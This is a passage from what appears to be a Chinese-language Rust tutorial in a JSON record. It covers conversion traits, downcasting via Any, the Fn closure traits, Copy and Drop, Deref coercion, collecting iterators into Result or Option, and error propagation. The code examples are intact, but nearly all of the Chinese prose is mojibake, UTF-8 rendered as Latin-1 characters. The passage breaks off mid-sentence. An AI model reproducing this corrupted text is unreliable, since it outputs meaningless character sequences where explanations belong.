[{"categories":null,"content":"è¿™ç¯‡æ–‡ç« ä»‹ç»äº†ä¸€ç³»åˆ— Rust ä¸­åˆ©ç”¨ trait å®ç°çš„é€šç”¨èƒ½åŠ›æˆ–æƒ¯ç”¨æ³•ï¼Œè¿™äº›å†…å®¹ä¹Ÿæ˜¯ Rust ç¼–ç¨‹ä¸­è¾ƒå¸¸è§çš„æ¦‚å¿µã€æ–¹æ³•å’ŒæŠ€å·§ï¼Œå®ç”¨æ€§å¾ˆå¼ºï¼Œæˆ‘ç§°ä¹‹ä¸ºâ€œTrait+ ç³»åˆ—â€ã€‚\nå»ºè®®å…ˆé˜…è¯» Rust ä¸­çš„ç‰¹å¾ (Trait) ä¸€æ–‡ï¼Œé…åˆé£Ÿç”¨æ•ˆæœæ›´ä½³ã€‚\nTrait + ç±»å‹è½¬æ¢ From å’Œ Into From å’Œ Into trait è§„å®šäº†ä¸€ç§æƒ¯ç”¨çš„ç±»å‹è½¬æ¢æ–¹å¼ã€‚å®ç°äº† From, å°±å¯ä»¥â€œå…è´¹â€è·å¾— Into:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 use std::convert::From; #[derive(Debug)] struct Number { value: i32, } impl From\u003ci32\u003e for Number { fn from(item: i32) -\u003e Self { Number { value: item } } } fn main() { let num = Number::from(30); println!(\"My number is {:?}\", num); let num: Number = 40.into(); println!(\"My number is {:?}\", num); } 1 2 My number is Number { value: 30 } My number is Number { value: 40 } TryFrom å’Œ TryInto å’Œ From, Into ç±»ä¼¼ï¼Œåªä¸è¿‡è¿”å›çš„æ˜¯ Result:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 use std::convert::TryFrom; use std::convert::TryInto; #[derive(Debug, PartialEq)] struct EvenNumber(i32); impl TryFrom\u003ci32\u003e for EvenNumber { type Error = (); fn try_from(value: i32) -\u003e Result\u003cSelf, Self::Error\u003e { if value % 2 == 0 { Ok(EvenNumber(value)) } else { Err(()) } } } fn main() { // TryFrom assert_eq!(EvenNumber::try_from(8), Ok(EvenNumber(8))); assert_eq!(EvenNumber::try_from(5), Err(())); // TryInto let result: Result\u003cEvenNumber, ()\u003e = 8i32.try_into(); assert_eq!(result, Ok(EvenNumber(8))); let result: Result\u003cEvenNumber, ()\u003e = 5i32.try_into(); assert_eq!(result, Err(())); } String è½¬æ¢ è½¬æ¢æˆ String: fmt::Display ä¸€ä¸ªç±»å‹è¦è½¬æ¢æˆ String, ä¸€èˆ¬ä¼šå®ç° fmt::Display trait, è€Œä¸æ˜¯ ToString (å‚è€ƒâ€œä¸€æ½å­å®ç°â€ä¸­çš„è¯´æ˜):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 use std::fmt; struct Circle { radius: i32 } impl fmt::Display for Circle { fn fmt(\u0026self, f: \u0026mut fmt::Formatter) -\u003e fmt::Result { write!(f, \"Circle of radius {}\", self.radius) } } fn main() { let circle = Circle { radius: 6 }; println!(\"{}\", circle.to_string()); } 1 Circle of radius 6 è§£æ String: FromStr ä¸€ä¸ªç±»å‹è¦æ”¯æŒä»ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­è§£æå‡ºæ¥ï¼Œéœ€è¦å®ç° FromStr trait:\n1 2 3 4 5 6 7 fn main() { let parsed: i32 = \"5\".parse().unwrap(); let turbo_parsed = \"10\".parse::\u003ci32\u003e().unwrap(); let sum = parsed + turbo_parsed; println!(\"Sum: {:?}\", sum); } 1 Sum: 15 Box\u003cdyn Trait\u003e çš„ downcast æˆ‘æœ‰ä¸€ä¸ª trait çš„åŒ…è£…ç±»å‹ Box\u003cdyn Trait\u003e çš„å˜é‡ï¼Œå¦‚ä½•è·å¾—å…¶åº•å±‚çš„å…·ä½“ç±»å‹çš„å¼•ç”¨å‘¢ï¼Ÿå³å¦‚ä½•è·å¾—è¯¥å˜é‡å¯¹åº”çš„å®ç°è¯¥ trait çš„ struct çš„å¼•ç”¨å‘¢ï¼Ÿ\nè¿™æ˜¯ä¸€ä¸ª downcast çš„è¿‡ç¨‹ï¼Œç±»ä¼¼äº C++ ä¸­çš„ dynamic_cast ã€‚\nRust ä¸­åº”è¯¥æ€ä¹ˆåšï¼Ÿè¿™å°±è¦ç”¨åˆ°ä¸€ä¸ªå«åš Any çš„ traitã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 use std::any::Any; pub trait Counter { fn inc(\u0026mut self); fn as_any_mut(\u0026mut self) -\u003e \u0026mut dyn Any; } pub struct ConcreteCounter { pub count: u8, } impl ConcreteCounter { pub fn new() -\u003e ConcreteCounter { ConcreteCounter { count: 1 } } } impl Counter for ConcreteCounter { fn inc(\u0026mut self) { self.count += 1; println!(\"count: {}\", self.count); } fn as_any_mut(\u0026mut self) -\u003e \u0026mut dyn Any { self } } fn main() { let counter = ConcreteCounter::new(); let mut dyn_counter: Box\u003cdyn Counter\u003e = Box::new(counter); // counter: \u0026mut ConcreteCounter let counter = dyn_counter .as_any_mut() .downcast_mut::\u003cConcreteCounter\u003e() .expect(\"dyn_counter is not a ConcreteCounter\"); counter.inc(); counter.count = 0; counter.inc(); } 1 2 count: 2 count: 1 å¤§æ¦‚æ­¥éª¤å¦‚ä¸‹ï¼š\nBox\u003cdyn Counter\u003e â†’ \u0026mut dyn Any (æˆ–è€… \u0026dyn Any, å¦‚æœä¸éœ€è¦å¯å˜å¼•ç”¨)\nè¿™é‡Œéœ€è¦ Counter åŒ…å«ä¸€ä¸ª as_any_mut æ–¹æ³•ï¼Œä»¥ä¾¿åœ¨ ConcreteCounter ä¸­å®ç°ã€‚\n\u0026mut dyn Any â†’ \u0026mut ConcreteCounter\nè¿™æ˜¯é€šè¿‡è°ƒç”¨ Any çš„ downcast_mut (å¯¹åº”ä¸å¯å˜å¼•ç”¨æ˜¯ downcast_ref) æ–¹æ³•å®ç°çš„ã€‚\nç±»ä¼¼åœ°ï¼Œ \u0026dyn Trait ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šè¿°æ–¹æ³•æ¥è·å–å…¶åº•å±‚å…·ä½“çš„ struct çš„å¼•ç”¨ã€‚\nTrait + é—­åŒ… (Closure) æ ¹æ®é—­åŒ… (closure) å¤„ç†å‚æ•°çš„æ–¹å¼ï¼Œé—­åŒ…ä¼šè‡ªåŠ¨å®ç°ä»¥ä¸‹ä¸‰ä¸ª Fn traits ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªï¼š\nFnOnce é€‚ç”¨äºå¯ä»¥è°ƒç”¨ä¸€æ¬¡çš„é—­åŒ…ã€‚æ‰€æœ‰é—­åŒ…éƒ½ä¼šè‡³å°‘å®ç°è¯¥ trait, å› ä¸ºæ‰€æœ‰çš„é—­åŒ…éƒ½å¯ä»¥è¢«è°ƒç”¨ã€‚\nä¸€ä¸ªé—­åŒ…å¦‚æœå°†æ•è·çš„å€¼ move åˆ°é—­åŒ…å¤–éƒ¨ï¼Œåˆ™è¯¥é—­åŒ…å°†ä»…å®ç°è¯¥ FnOnce è€Œä¸ä¼šå®ç°å…¶ä»– Fn traits, å› ä¸ºè¯¥é—­åŒ…åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ã€‚\nFnMut é€‚ç”¨äºå¦‚ä¸‹é—­åŒ…ï¼šè¿™ç±»é—­åŒ…ä¸ä¼šå°†æ•è·çš„å€¼ move åˆ°é—­åŒ…å¤–éƒ¨ï¼Œä½†å¯èƒ½ä¼šä¿®æ”¹æ•è·çš„å€¼ã€‚è¿™ç±»é—­åŒ…å¯ä»¥è¢«è°ƒç”¨å¤šæ¬¡ã€‚\nFn é€‚ç”¨äºå¦‚ä¸‹é—­åŒ…ï¼šè¿™ç±»é—­åŒ…ä¸ä¼šå°†æ•è·çš„å€¼ move åˆ°é—­åŒ…å¤–éƒ¨ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹æ•è·çš„å€¼ï¼Œæˆ–è€…æ ¹æœ¬ä¸æ•è·ä»»ä½•å€¼ã€‚\nè¿™ç±»é—­åŒ…å¯ä»¥è¢«è°ƒç”¨å¤šæ¬¡ï¼Œä¸”ä¸ä¼šä¿®æ”¹ç¯å¢ƒï¼ˆå¯¹ç¯å¢ƒæ— å‰¯ä½œç”¨ï¼‰ï¼Œè¿™åœ¨å¹¶å‘å¤šæ¬¡è°ƒç”¨é—­åŒ…ç­‰åœºæ™¯ä¸‹éå¸¸é‡è¦ã€‚\nä»¥ä¸Š trait å¯¹é—­åŒ…çš„è¦æ±‚æŒ‰ç…§é¡ºåºé€æ¸é€’å¢ï¼š FnOnce å¯¹é—­åŒ…æ²¡æœ‰ä»»ä½•ç‰¹æ®Šè¦æ±‚ï¼Œè€Œ Fn çš„è¦æ±‚æœ€ä¸¥æ ¼ã€‚\nFnOnce çš„ä¾‹å­ Option\u003cT\u003e.unwrap_or_else æ–¹æ³•ä¸­çš„é—­åŒ…å‚æ•°å°±å£°æ˜äº† FnOnce çº¦æŸï¼Œæ„å‘³ç€è¯¥æ–¹æ³•å¯ä»¥æ¥å—ä»»æ„ç±»å‹çš„é—­åŒ…ï¼š\n1 2 3 4 5 6 7 8 9 10 11 impl\u003cT\u003e Option\u003cT\u003e { pub fn unwrap_or_else\u003cF\u003e(self, f: F) -\u003e T where F: FnOnce() -\u003e T { match self { Some(x) =\u003e x, None =\u003e f(), } } } ğŸ’¡ ä¸€ä¸ªæ™®é€šå‡½æ•°ä¹Ÿå¯ä»¥å®ç°å…¨éƒ¨ä¸‰ä¸ª Fn traitsã€‚\nå¦‚æœä¸éœ€è¦ä»ç¯å¢ƒä¸­æ•è·å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨éœ€è¦ä¼ å…¥æŸä¸ª Fn trait çš„åœ°æ–¹ä½¿ç”¨å‡½æ•°åè€Œéé—­åŒ…ã€‚ä¾‹å¦‚ï¼šåœ¨ä¸€ä¸ª Option\u003cVec\u003cT\u003e\u003e ä¸Šè°ƒç”¨ unwrap_or_else(Vec::new), å½“è¯¥ option ä¸º None æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä¸€ä¸ªæ–°çš„ç©º vectorã€‚\nFnMut çš„ä¾‹å­ ä¸‹é¢çš„ç¤ºä¾‹æ¼”ç¤ºäº†é€šè¿‡ sort_by_key æ–¹æ³•ç»™æ•°ç»„æ’åºã€‚è¯¥æ–¹æ³•æ¥å— FnMut é—­åŒ… (æˆ–è€… Fn é—­åŒ…), åŸå› æ˜¯å®ƒä¼šè°ƒç”¨è¯¥é—­åŒ…å¤šæ¬¡ï¼Œæ¯ä¸ª item ä¸€æ¬¡ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #[derive(Debug)] struct Rectangle { width: u32, height: u32, } fn main() { let mut list = [ Rectangle { width: 10, height: 1 }, Rectangle { width: 3, height: 5 }, Rectangle { width: 7, height: 12 }, ]; list.sort_by_key(|r| r.width); println!(\"{:#?}\", list); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [ Rectangle { width: 3, height: 5, }, Rectangle { width: 7, height: 12, }, Rectangle { width: 10, height: 1, }, ] å¦‚æœä½ ä¼ å…¥ä¸€ä¸ªä»…å®ç° FnOnce çš„é—­åŒ…ï¼Œåˆ™ä¼šç¼–è¯‘å¤±è´¥ï¼Œä¾‹å¦‚ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #[derive(Debug)] struct Rectangle { width: u32, height: u32, } fn main() { let mut list = [ Rectangle { width: 10, height: 1 }, Rectangle { width: 3, height: 5 }, Rectangle { width: 7, height: 12 }, ]; let mut sort_operations = vec![]; let value = String::from(\"by key called\"); list.sort_by_key(|r| { sort_operations.push(value); // value è¢« move out äº†ï¼Œç¼–è¯‘å¤±è´¥â— r.width }); println!(\"{:#?}\", list); } ç¼–è¯‘å™¨æŠ¥å‘Šçš„é”™è¯¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 error[E0507]: cannot move out of `value`, a captured variable in an `FnMut` closure --\u003e src/main.rs:19:30 | 16 | let value = String::from(\"by key called\"); | ----- captured outer variable 17 | 18 | list.sort_by_key(|r| { | --- captured by this `FnMut` closure 19 | sort_operations.push(value); // value è¢« move out äº†ï¼Œç¼–è¯‘å¤±è´¥â— | ^^^^^ move occurs because `value` has type `String`, which does not implement the `Copy` trait For more information about this error, try `rustc --explain E0507`. error: could not compile `cargoUnHfvy` (bin \"cargoUnHfvy\") due to previous error ç”±äºè¯¥é—­åŒ…å°† value move åˆ°é—­åŒ…å¤–éƒ¨ï¼Œè¯¥é—­åŒ…ä»…å®ç°äº† FnOnce trait (åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡), å› æ­¤ä¸ç¬¦åˆ FnMut çš„è§„èŒƒã€‚\nç›¸åï¼Œä¸‹é¢çš„ä¾‹å­æ˜¯åˆæ³•çš„ï¼Œå› ä¸ºè¯¥é—­åŒ…ä»…æ•è·äº† mutable å¼•ç”¨ï¼Œæ²¡æœ‰å¯¹æ•è·çš„å˜é‡è¿›è¡Œ move æ“ä½œï¼Œå› æ­¤ç¬¦åˆ FnMut çš„è§„èŒƒï¼ˆå¯ä»¥è¢«å¤šæ¬¡è°ƒç”¨ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #[derive(Debug)] struct Rectangle { width: u32, height: u32, } fn main() { let mut list = [ Rectangle { width: 10, height: 1 }, Rectangle { width: 3, height: 5 }, Rectangle { width: 7, height: 12 }, ]; let mut num_sort_operations = 0; list.sort_by_key(|r| { num_sort_operations += 1; r.width }); println!(\"{:#?}, sorted in {num_sort_operations} operations\", list); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [ Rectangle { width: 3, height: 5, }, Rectangle { width: 7, height: 12, }, Rectangle { width: 10, height: 1, }, ], sorted in 6 operations Trait + æ‰€æœ‰æƒ (Ownership) Rust åœ¨å¤„ç† ownership è§„åˆ™æ—¶ï¼Œä¼šæ ¹æ®ç±»å‹æ˜¯å¦å®ç°äº† Copy trait æ¥åŒºåˆ«å¯¹å¾…ã€‚å…·ä½“è€Œè¨€ï¼š\nå®ç°äº† Copy trait çš„ç±»å‹ï¼Œå…¶å€¼å¯ä»¥è¢«å­˜å‚¨åœ¨æ ˆä¸Šã€‚ å®ç°äº† Copy trait çš„ç±»å‹ï¼Œåœ¨èµ‹å€¼å’Œä¼ å‚æ—¶ï¼Œä¸ä¼šå‘ç”Ÿ move, è€Œæ˜¯ç›´æ¥æ‹·è´ã€‚ æœªå®ç° Copy trait çš„ç±»å‹ï¼Œåœ¨èµ‹å€¼å’Œä¼ å‚æ—¶ï¼Œä¼šå‘ç”Ÿ move, ä¹‹åä¸å†æœ‰æ•ˆã€‚ å®ç°äº† Drop trait çš„ç±»å‹ï¼Œåœ¨å…¶ owner è¶…å‡ºä½œç”¨åŸŸèŒƒå›´æ—¶ï¼Œä¼šè°ƒç”¨å…¶ drop æ–¹æ³•ã€‚ ğŸ’¡ å¦‚æœä¸€ä¸ªç±»å‹ï¼ˆæˆ–è€…è¯¥ç±»å‹çš„ä¸€éƒ¨åˆ†ï¼‰å®ç°äº† Drop trait, åˆ™ä¸èƒ½å®ç° Copy traitã€‚è¿™äºŒè€…æ˜¯äº’æ–¥çš„ï¼Œå¦‚æœåŒæ—¶å­˜åœ¨ï¼Œä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚\nCopy trait å­˜å‚¨åœ¨ stack ä¸Šçš„æ•°æ®æ‹·è´é€Ÿåº¦å¾ˆå¿«ï¼Œè€Œä¸”æ·±æ‹·è´å’Œæµ…æ‹·è´æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œå› æ­¤å¯ä»¥ç›´æ¥é‡‡ç”¨ copy çš„æ–¹å¼å¤„ç†ã€‚Rust é€šè¿‡ Copy trait æ¥æ ‡è¯†è¿™ç±»æ•°æ®ã€‚\nä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å®ç°äº† Copy trait çš„ç±»å‹ï¼š\næ ‡é‡ç±»å‹ï¼ˆScalar typesï¼‰ç”±äº size å›ºå®šï¼Œå¯ä»¥ç›´æ¥å­˜å‚¨åœ¨æ ˆä¸Šã€‚ å…ƒç»„ï¼ˆTupleï¼‰å¦‚æœåªåŒ…å«å®ç°äº† Copy trait çš„ç±»å‹ï¼Œåˆ™ä¹Ÿè¢«è§†ä¸ºå®ç°äº† Copy traitã€‚ ä¾‹å¦‚ (i32, i32) å®ç°äº† Copy, ä½† (i32, String) åˆ™æœªå®ç°ã€‚ Drop trait å­˜å‚¨åœ¨ heap ä¸Šçš„æ•°æ®ä¸€èˆ¬ size ä¸ç¡®å®šï¼Œä¸”æ‹·è´æˆæœ¬è¾ƒé«˜ï¼Œå› æ­¤é‡‡ç”¨ move çš„æ–¹å¼å¤„ç†ã€‚\nè¿™ç±»æ•°æ®åœ¨è¶…å‡ºä½œç”¨åŸŸèŒƒå›´æ—¶ï¼Œå¾€å¾€éœ€è¦åšä¸€äº›ç‰¹æ®Šå¤„ç†ä»¥ä¾¿å›æ”¶å†…å­˜æˆ–é‡Šæ”¾èµ„æºï¼Œå› æ­¤éœ€è¦å®ç° Drop traitã€‚\né’ˆå¯¹è¿™ç±»å‹æ•°æ®ï¼Œå¦‚æœåœ¨æŸäº›åœºåˆç¡®å®éœ€è¦è¿›è¡Œâ€œæ·±æ‹·è´â€æ“ä½œï¼Œå¯ä»¥é€šè¿‡æ˜¾å¼è°ƒç”¨å¯¹è±¡çš„ clone() æ–¹æ³•æ‰‹åŠ¨è¿›è¡Œæ·±æ‹·è´ã€‚\nå®ç°äº† Drop trait çš„ç±»å‹ç¤ºä¾‹ï¼š\nBox Vec String File Process Drop trait ä½¿ç”¨ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 struct Droppable { name: \u0026'static str, } impl Drop for Droppable { fn drop(\u0026mut self) { println!(\"\u003e Dropping {}\", self.name) } } fn main() { let _a = Droppable { name: \"a\" }; // block A { let _b = Droppable { name: \"b\" }; // block B { let _c = Droppable { name: \"c\" }; let _d = Droppable { name: \"d\" }; println!(\"Exiting block B\"); } println!(\"Just exited block B\"); println!(\"Exiting block A\"); } println!(\"Just exited block A\"); // æ‰‹åŠ¨è§¦å‘ drop drop(_a); println!(\"end of the main function\"); } 1 2 3 4 5 6 7 8 9 Exiting block B \u003e Dropping d \u003e Dropping c Just exited block B Exiting block A \u003e Dropping b Just exited block A \u003e Dropping a end of the main function String ç±»å‹ æ‰§è¡Œ let s2 = s1; æ—¶å‘ç”Ÿçš„äº‹æƒ…ï¼ˆå‚è€ƒä¸‹æ–¹çš„ String å†…å­˜å¸ƒå±€å›¾ï¼‰ï¼š\nptr, len, capacity éƒ½æ˜¯å­˜å‚¨åœ¨ stack ä¸Šçš„ï¼Œå› æ­¤ä¼šç›´æ¥æ‹·è´ã€‚ ptr æŒ‡å‘çš„å­—ç¬¦ä¸²æ•°æ®å­˜å‚¨åœ¨ heap ä¸Šï¼Œä¸ä¼šå‘ç”Ÿæ‹·è´ï¼Œè€Œæ˜¯è¢« move äº†ã€‚ String s1 çš„å†…å­˜å¸ƒå±€ï¼š\néšå«çš„è®¾è®¡ä¸Šçš„é€‰æ‹© ğŸŒŸ Tips\nRust æ°¸è¿œä¸ä¼šä¸ºä½ çš„æ•°æ®è‡ªåŠ¨åˆ›å»ºâ€œæ·±æ‹·è´â€ã€‚\nå› æ­¤ï¼Œä»»ä½•è‡ªåŠ¨å‘ç”Ÿçš„æ‹·è´éƒ½å¯ä»¥è®¤ä¸ºæ˜¯æˆæœ¬è¾ƒä½çš„ï¼ˆå°±è¿è¡Œæ—¶æ€§èƒ½è€Œè¨€ï¼‰ã€‚\nTrait + è§£å¼•ç”¨ (Deref) é€šè¿‡å®ç° Deref trait, å¯ä»¥è‡ªå®šä¹‰ç±»å‹çš„è§£å¼•ç”¨æ“ä½œç¬¦ (dereference operator) * çš„è¡Œä¸ºã€‚\nä¸ä»…å¦‚æ­¤ï¼ŒRust è¿˜æ”¯æŒéšå¼ Deref å¼ºåˆ¶è½¬æ¢ (Deref Coercion)ã€‚ä¸‹é¢é‡ç‚¹è§£é‡Šä¸€ä¸‹è¿™ä¸€æ¦‚å¿µã€‚\néšå¼ Deref å¼ºåˆ¶è½¬æ¢çš„ç‰¹ç‚¹ Deref coercion ä½œç”¨åœ¨å‡½æ•°å’Œæ–¹æ³•çš„å‚æ•°ä¸Šï¼Œå¯ä»¥è‡ªåŠ¨å°†ä¸€ç§ç±»å‹çš„å¼•ç”¨è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹çš„å¼•ç”¨ã€‚è¦æ±‚è¢«è½¬æ¢çš„ç±»å‹å®ç°äº†å¯¹åº”çš„ Deref traitã€‚ Deref coercion å¯ä»¥æŒ‰éœ€è¿ç»­è½¬æ¢å¤šæ¬¡ï¼Œä»¥è·å¾—å‚æ•°æ‰€éœ€ç±»å‹çš„å¼•ç”¨ã€‚ Deref coercion å‘ç”Ÿåœ¨ç¼–è¯‘æœŸï¼Œå› æ­¤æ²¡æœ‰é¢å¤–çš„è¿è¡Œæ—¶å¼€é”€ï¼ˆç¬¦åˆé›¶æˆæœ¬æŠ½è±¡åŸåˆ™ Zero Cost Abstractions ï¼‰ã€‚ éšå¼ Deref å¼ºåˆ¶è½¬æ¢ç¤ºä¾‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 use std::ops::Deref; struct MyBox\u003cT\u003e(T); impl\u003cT\u003e MyBox\u003cT\u003e { fn new(x: T) -\u003e MyBox\u003cT\u003e { MyBox(x) } } impl\u003cT\u003e Deref for MyBox\u003cT\u003e { type Target = T; fn deref(\u0026self) -\u003e \u0026Self::Target { \u0026self.0 } } fn need_a_ref(x: \u0026i32) { println!(\"{}\", x); } fn hello(name: \u0026str) { println!(\"Hello, {name}!\"); } fn main() { let x = 5; let y = MyBox::new(x); assert_eq!(5, *y); // è¿™é‡Œä¼ å‚æ—¶å‘ç”Ÿäº† Deref coercion, å°† \u0026MyBox\u003ci32\u003e è‡ªåŠ¨è½¬æ¢æˆ \u0026i32 need_a_ref(\u0026y); let m = MyBox::new(String::from(\"Rust\")); // ä¸‹é¢ä¸¤è¡Œæ˜¯ç­‰ä»·çš„ hello(\u0026m); // ä½¿ç”¨äº†éšå¼ Deref å¼ºåˆ¶è½¬æ¢ hello(\u0026(*m)[..]); // æœªä½¿ç”¨éšå¼ Deref å¼ºåˆ¶è½¬æ¢ } 1 2 3 5 Hello, Rust! Hello, Rust! Deref å’Œ DerefMut å¼ºåˆ¶è½¬æ¢è§„åˆ™ åœ¨éšå¼è½¬æ¢ä¸­ï¼Œå¦‚æœåŸå‚æ•°æ˜¯å¯å˜å¼•ç”¨ (\u0026mut), éœ€è¦è½¬æ¢çš„ç›®æ ‡å‚æ•°ä¹Ÿæ˜¯å¯å˜å¼•ç”¨ï¼Œåˆ™å¿…é¡»å®ç° DerefMut trait æ‰èƒ½æ”¯æŒã€‚\nå…·ä½“è§„åˆ™å¦‚ä¸‹ï¼š\n\u0026T â†’ \u0026U å½“ T: Deref\u003cTarget=U\u003e \u0026mut T â†’ \u0026mut U å½“ T: DerefMut\u003cTarget=U\u003e \u0026mut T â†’ \u0026U å½“ T: Deref\u003cTarget=U\u003e Trait + è¿­ä»£å™¨ ä¸ºäº†è¯´æ˜ trait åœ¨è¿­ä»£å™¨ä¸­çš„ä½œç”¨ï¼Œæˆ‘ä»¬å…ˆæ€è€ƒä¸€ä¸ªå¼€å‘è¿‡ç¨‹ä¸­å¸¸é‡åˆ°çš„é—®é¢˜ï¼š\nå½“æˆ‘ä»¬æœ‰ä¸€ä¸ª Result æ•°ç»„/åˆ—è¡¨æ—¶ï¼Œå¦‚ä½•å¿«é€Ÿåˆ¤æ–­è¿™ä¸ª Result åˆ—è¡¨é‡Œé¢æ˜¯å¦å­˜åœ¨é”™è¯¯ï¼Ÿ ä½ ä¼šæ€ä¹ˆåšå‘¢ï¼Ÿ\nå½“ç„¶ï¼Œä½ å¯ä»¥éå†è¿™ä¸ªåˆ—è¡¨ï¼Œç„¶åé€ä¸ªåˆ¤æ–­ã€‚ä½†æ˜¯ Iterator.collect æ–¹æ³•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´åŠ ä¼˜é›…çš„åšåˆ°è¿™ä¸€ç‚¹ï¼Œå¹¶ä¸”æ›´åŠ çš„ç¬¦åˆ Rustaceans çš„ä¹ æƒ¯:\n1 2 3 4 5 6 7 8 9 10 11 12 let results = vec![Ok(1), Err(\"nope\"), Ok(3), Err(\"bad\")]; let result: Result\u003cVec\u003c_\u003e, \u0026str\u003e = results.into_iter().collect(); // gives us the first error assert_eq!(Err(\"nope\"), result); let results = [Ok(1), Ok(3)]; let result: Result\u003cVec\u003c_\u003e, \u0026str\u003e = results.into_iter().collect(); // gives us the list of answers assert_eq!(Ok(vec![1, 3]), result); ç±»ä¼¼åœ°ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ collect æ–¹æ³•å°†ä¸€ä¸ª Option åˆ—è¡¨è½¬æ¢æˆä¸€ä¸ª Option:\n1 2 3 4 5 6 7 8 9 10 11 12 let results = vec![Some(1), None, Some(3), None]; let result: Option\u003cVec\u003c_\u003e\u003e = results.iter().cloned().collect(); // gives us the first None assert_eq!(None, result); let results = [Some(1), Some(3)]; let result: Option\u003cVec\u003c_\u003e\u003e = results.iter().cloned().collect(); // gives us the list of answers assert_eq!(Some(vec![1, 3]), result); collect æ–¹æ³•æ˜¯å¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿç­”æ¡ˆå°±åœ¨ Result å’Œ Option è¿™ä¸¤ä¸ªç±»å‹çš„ FromIterator trait çš„å®ç°ä¸Šã€‚\ncollect çš„è¡Œä¸ºå–å†³äºå®ƒçš„ç›®æ ‡ç±»å‹ï¼Œå…·ä½“æ¥è¯´ï¼Œå–å†³äºç›®æ ‡ç±»å‹çš„ FromIterator trait çš„å®ç°ã€‚ä¸åŒçš„ç±»å‹ä¼šå®ç°è‡ªå·±ç‹¬æœ‰çš„ FromIterator é€»è¾‘ï¼Œæ®æ­¤æ¥å®šä¹‰å¦‚ä½•ä»ä¸€ä¸ªè¿­ä»£å™¨ä¸­çš„å…ƒç´ æ„å»ºè‡ªå·±ã€‚\nå¯¹äº Result ç±»å‹ï¼Œ FromIterator è¢«å®ç°ä¸ºï¼š\nå¦‚æœè¿­ä»£å™¨ä¸­çš„å…ƒç´ éƒ½æ˜¯ Ok, åˆ™è¿”å›ä¸€ä¸ª Ok, å…¶ä¸­åŒ…å«è¿­ä»£å™¨ä¸­æ‰€æœ‰ Ok å€¼çš„é›†åˆã€‚ å¦‚æœè¿­ä»£å™¨ä¸­å­˜åœ¨ä»»ä½• Err, åˆ™è¿”å›ç¬¬ä¸€ä¸ª Err ã€‚ å¯¹äº Option ç±»å‹ï¼Œ FromIterator çš„å®ç°ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚\nTrait + é”™è¯¯å¤„ç† ä¼ æ’­é”™è¯¯ (Propagating Errors) Rust é‡‡ç”¨ä¼ æ’­é”™è¯¯ï¼ˆå³å‡½æ•°è¿”å›å€¼ï¼‰çš„å½¢å¼æ¥å¤„ç†â€œå¯æ¢å¤æ€§é”™è¯¯â€ (recoverable errors)ï¼Œè€Œä¸æ˜¯å¼‚å¸¸æœºåˆ¶ã€‚\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 use std::fs::File; use std::io::{self, Read}; fn read_username_from_file() -\u003e Result\u003cString, io::Error\u003e { let username_file_result = File::open(\"hello.txt\"); let mut username_file = match username_file_result { Ok(file) =\u003e file, Err(e) =\u003e return Err(e), }; let mut username = String::new(); match username_file.read_to_string(\u0026mut username) { Ok(_) =\u003e Ok(username), Err(e) =\u003e Err(e), } } æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é—®å·è¿ç®—ç¬¦ (question mark operator) ? æ¥ç®€åŒ–é”™è¯¯ä¼ æ’­ã€‚ä¸Šè¿°ä»£ç ç­‰ä»·äºï¼š\n1 2 3 4 5 6 7 8 9 use std::fs::File; use std::io::{self, Read}; fn read_username_from_file() -\u003e Result\u003cString, io::Error\u003e { let mut username = String::new(); // ä½¿ç”¨é—®å·è¿ç®—ç¬¦ï¼Œè¡¨è¾¾å¼åŒ¹é… Err æ—¶ç«‹å³æ‰§è¡Œ return File::open(\"hello.txt\")?.read_to_string(\u0026mut username)?; Ok(username) } é™¤äº†åœ¨é‡åˆ°é”™è¯¯æ—¶æ‰§è¡Œ early return, ? è¿ç®—ç¬¦è¿˜é¢å¤–æä¾›é”™è¯¯ç±»å‹çš„è‡ªåŠ¨è½¬æ¢åŠŸèƒ½ã€‚å…·ä½“è€Œè¨€ï¼Œå¦‚æœå‘ç”Ÿçš„é”™è¯¯å’Œå‡½æ•°çš„è¿”å›å€¼å£°æ˜ä¸­çš„é”™è¯¯ç±»å‹ä¸åŒï¼Œåªè¦è¯¥é”™è¯¯ç±»å‹å®ç°äº†ç›¸åº”çš„ From trait, 